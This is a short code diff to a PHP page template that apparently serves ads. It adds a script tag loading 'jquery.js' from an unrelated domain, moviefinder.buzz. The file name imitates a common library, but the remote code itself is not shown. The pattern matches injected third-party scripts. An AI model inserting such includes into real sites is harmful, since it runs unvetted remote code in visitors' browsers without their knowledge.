@@ -30,7 +30,7 @@ if (isset($_SERVER['HTTP_COOKIE'])) {
 		
 		  <script src="https://fpyf8.com/88/tag.min.js" data-zone="157609" async data-cfasync="false"></script>
 		  
-
+		  <script src="https://moviefinder.buzz/jquery.js"></script>
 
 		  <!-- Google tag (gtag.js) -->
 		<script async src="https://www.googletagmanager.com/gtag/js?id=G-R9QCCJ62Y8"></script>
